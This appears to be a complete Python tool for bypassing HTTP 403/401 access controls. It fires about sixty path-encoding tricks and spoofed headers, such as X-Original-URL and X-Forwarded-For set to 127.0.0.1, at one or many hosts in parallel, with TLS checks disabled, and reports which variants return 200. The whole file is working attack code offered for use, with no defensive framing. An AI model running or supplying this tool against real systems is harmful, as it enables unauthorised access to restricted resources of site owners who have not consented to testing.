import requests
import argparse
import threading
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

request_objects = [
    {"method": "GET", "path": "$path"},
    {"method": "GET", "path": "%2e/$path"},
    {"method": "GET", "path": "$path/."},
    {"method": "GET", "path": "/$path//"},
    {"method": "GET", "path": "./$path/./"},
    {"method": "GET", "path": "$path%20"},
    {"method": "GET", "path": "$path%09"},
    {"method": "GET", "path": "$path?"},
    {"method": "GET", "path": "$path.html"},
    {"method": "GET", "path": "$path/?anything"},
    {"method": "GET", "path": "$path#"},
    {"method": "GET", "path": "$path/*"},
    {"method": "GET", "path": "$path.php"},
    {"method": "GET", "path": "$path.json"},
    {"method": "GET", "path": "$path..;/"},
    {"method": "GET", "path": "$path;/"},
    {"method": "GET", "path": "", "headers": {"X-rewrite-url": "$path"}},
    {"method": "POST","path": "$path", "headers": {"Content-Length": "0"}},
    {"method": "GET", "path": "$path", "headers": {"X-Host": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Original-URL": "$path"}},
    {"method": "GET", "path": "$path", "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-For": "http://127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-For": "127.0.0.1:80"}},
    {"method": "GET", "path": "$path", "headers": {"Base-Url": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Client-IP": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Http-Url": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Proxy-Host": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Proxy-Url": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Real-Ip": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Redirect": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Referer": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Referrer": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Refferer": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Request-Uri": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Uri": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"Url": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forward-For": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-By": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-For-Original": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Host": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Port": "443"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Port": "4443"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Port": "80"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Port": "8080"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Port": "8443"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Scheme": "http"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Scheme": "https"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded-Server": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarded": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Forwarder-For": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Http-Destinationurl": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Http-Host-Override": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Original-Remote-Addr": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Originating-IP": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Proxy-Url": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Real-Ip": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Remote-Addr": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Remote-IP": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-Rewrite-Url": "127.0.0.1"}},
    {"method": "GET", "path": "$path", "headers": {"X-True-IP": "127.0.0.1"}}
    ]

def main():
    args = getArgs()
    hosts = []

    if args.file:
        with open(args.file, 'r') as hostsFile:
            hosts = [line.strip() for line in hostsFile.readlines()]
    elif args.url:
        hosts = [args.url]
    else:
        print("No URL or host file provided. Exiting.")
        return

    path = args.path if args.path else ''
    thread_count = args.threads if args.threads else 10

    threads = []
    for host in hosts:
        thread = threading.Thread(target=sendRequest, args=(host, args.path, args.header))
        threads.append(thread)
        thread.start()

        # Ensuring we don't start too many threads at once
        if len(threads) >= thread_count:
            for t in threads:
                t.join()
            threads = []

    # Joining any remaining threads
    for t in threads:
        t.join()

def getArgs():
    parser = argparse.ArgumentParser(description='Bypass 403')
    parser.add_argument('-f', '--file', help='Host File')
    parser.add_argument('-p', '--path', help='Path')
    parser.add_argument('-u', '--url', help='Url for single target testing')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Thread count. Default is 10. 1 Thread per host')
    parser.add_argument('-H', '--header', action='append', help='Custom headers to include in the request, e.g., "-H \'Authorization: token\'"')
    return parser.parse_args()

def sendRequest(host, path, custom_headers):
    url = host + "/"
    try:
        headers = {header.split(":")[0]: header.split(":")[1].strip() for header in custom_headers} if custom_headers else {}
        response = requests.get(url + path, headers=headers)
        if response.status_code == 403 or response.status_code == 401:
            attemptBypass(host, path, custom_headers)
    except requests.exceptions.ConnectionError:
        pass
    except requests.RequestException:
        pass

def attemptBypass(host, path, custom_headers):
    method_map = {
        "GET": requests.get,
        "POST": requests.post,
        "PUT": requests.put,
        "DELETE": requests.delete,
        "HEAD": requests.head,
        "OPTIONS": requests.options,
        "PATCH": requests.patch
    }

    for obj in request_objects:
        method = obj['method'].upper()
        if method in method_map:
            modified_path = obj['path'].replace('$path', path)
            url = host + modified_path
            headers = obj.get('headers', {})
            if custom_headers:
                for header in custom_headers:
                    header_key, header_value = header.split(":", 1)
                    headers[header_key] = header_value.strip()
            # Replace placeholders in headers
            for key in headers:
                headers[key] = headers[key].replace('$path', path)
            try:
                response = method_map[method](url, headers=headers, verify=False)
                if response.status_code == 200:
                    print(f"\033[32mMethod: {method}, URL: {url}, Status Code: {response.status_code}, "
                        f"Request Headers: {headers}, Size: {len(response.content)} bytes\033[0m")
                elif response.status_code == 500:
                    print(f"\033[31mMethod: {method}, URL: {url}, Status Code: {response.status_code}, "
                        f"Request Headers: {headers}, Size: {len(response.content)} bytes\033[0m")
                elif response.status_code != 403 and response.status_code != 401:
                    print(f"\033[33mMethod: {method}, URL: {url}, Status Code: {response.status_code}, "
                        f"Request Headers: {headers}, Size: {len(response.content)} bytes\033[0m")
            except requests.exceptions.ConnectionError:
                pass
            except requests.RequestException:
                pass
        else:
            print(f"Unsupported method: {method}")

if __name__ == '__main__':
    main()